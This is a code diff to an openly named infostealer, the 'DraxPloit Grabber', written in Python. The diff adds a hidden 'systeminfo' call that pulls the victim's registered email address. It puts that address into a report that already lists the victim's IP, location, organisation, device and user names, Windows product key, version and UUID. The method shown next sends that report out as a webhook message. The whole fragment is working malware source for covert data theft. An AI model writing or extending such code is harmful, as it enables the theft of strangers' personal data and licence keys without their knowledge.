@@ -80,9 +80,21 @@ class Exploit:
         except Exception:
             deviceName = "N/A"
             deviceUser = "N/A"
+        try: 
+            proc = subprocess.Popen(['systeminfo'], creationflags=flag, stdout=subprocess.PIPE)
+            output = proc.communicate()[0].decode('latin-1')
+            lines = output.split('\n')
+
+            if len(lines) >= 10:
+                registeredMail = lines[7].strip()
+                registeredMail = registeredMail.split(':')[1].strip()
+                if not '@' in registeredMail:
+                    registeredMail = "N/A"
+        except Exception:
+            registeredMail = "N/A"
 
             
-        self.log = f"**DraxPloit Grabber** beamed a **NEW** user: ```\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}\n\nOrg: {org}\nDevice Name: {deviceName}\nDevice User: {deviceUser}\nWindows-Key: {w1nk33y}\nWindows Version: {w1nv3r}\nUUID: {uuidwndz}```"
+        self.log = f"**DraxPloit Grabber** beamed a **NEW** user: ```\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}\n\nOrg: {org}\nDevice Name: {deviceName}\nDevice User: {deviceUser}\nRegistered Mail: {registeredMail}\nWindows-Key: {w1nk33y}\nWindows Version: {w1nv3r}\nUUID: {uuidwndz}```"
 
     def sendMainData(self):
         data = {"content": self.log, "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
